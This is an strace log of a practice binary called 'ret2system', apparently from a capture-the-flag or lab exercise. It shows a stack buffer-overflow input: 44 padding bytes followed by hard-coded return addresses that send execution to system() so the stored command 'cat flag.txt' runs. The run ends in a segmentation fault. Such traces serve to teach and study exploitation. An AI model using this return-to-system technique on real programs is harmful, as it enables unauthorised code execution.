execve("./ret2system", ["./ret2system"], 0x7ffce50b8230 /* 47 vars */) = 0
brk(NULL)                               = 0x9750000
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7eec000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=89299, ...}) = 0
mmap2(NULL, 89299, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7ed6000
close(3)                                = 0
openat(AT_FDCWD, "/lib32/libc.so.6", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\361\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=2013884, ...}) = 0
mmap2(NULL, 2023192, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7ce8000
mprotect(0xf7d05000, 1880064, PROT_NONE) = 0
mmap2(0xf7d05000, 1409024, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1d000) = 0xf7d05000
mmap2(0xf7e5d000, 466944, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x175000) = 0xf7e5d000
mmap2(0xf7ed0000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0xf7ed0000
mmap2(0xf7ed4000, 7960, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7ed4000
close(3)                                = 0
set_thread_area({entry_number=-1, base_addr=0xf7eed100, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
mprotect(0xf7ed0000, 8192, PROT_READ)   = 0
mprotect(0x804b000, 4096, PROT_READ)    = 0
mprotect(0xf7f1f000, 4096, PROT_READ)   = 0
munmap(0xf7ed6000, 89299)               = 0
alarm(32)                               = 0
rt_sigaction(SIGINT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=0}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=0}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
mmap2(NULL, 36864, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0xf7ee3000
rt_sigprocmask(SIG_BLOCK, ~[], [CHLD], 8) = 0
clone(child_stack=0xf7eebfe4, flags=CLONE_VM|CLONE_VFORK|SIGCHLD) = 2976
munmap(0xf7ee3000, 36864)               = 0
rt_sigprocmask(SIG_SETMASK, [CHLD], NULL, 8) = 0
wait4(2976, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 2976
rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, NULL, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, NULL, 8) = 0
rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=2976, si_uid=1000, si_status=0, si_utime=0, si_stime=0} ---
write(1, "You are allowed to store some va"..., 35) = 35
write(1, "\n", 1)                       = 1
read(0, "c", 1)                         = 1
read(0, "a", 1)                         = 1
read(0, "t", 1)                         = 1
read(0, " ", 1)                         = 1
read(0, "f", 1)                         = 1
read(0, "l", 1)                         = 1
read(0, "a", 1)                         = 1
read(0, "g", 1)                         = 1
read(0, ".", 1)                         = 1
read(0, "t", 1)                         = 1
read(0, "x", 1)                         = 1
read(0, "t", 1)                         = 1
read(0, "\n", 1)                        = 1
write(1, "Enter the buffer now", 20)    = 20
write(1, "\n", 1)                       = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "A", 1)                         = 1
read(0, "\324", 1)                      = 1
read(0, "\220", 1)                      = 1
read(0, "\4", 1)                        = 1
read(0, "\10", 1)                       = 1
read(0, "s", 1)                         = 1
read(0, "\223", 1)                      = 1
read(0, "\4", 1)                        = 1
read(0, "\10", 1)                       = 1
read(0, "`", 1)                         = 1
read(0, "\300", 1)                      = 1
read(0, "\4", 1)                        = 1
read(0, "\10", 1)                       = 1
read(0, "\n", 1)                        = 1
write(1, "cat flag.txt\n", 13)          = 13
write(1, "\n", 1)                       = 1
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xa} ---
+++ killed by SIGSEGV (core dumped) +++
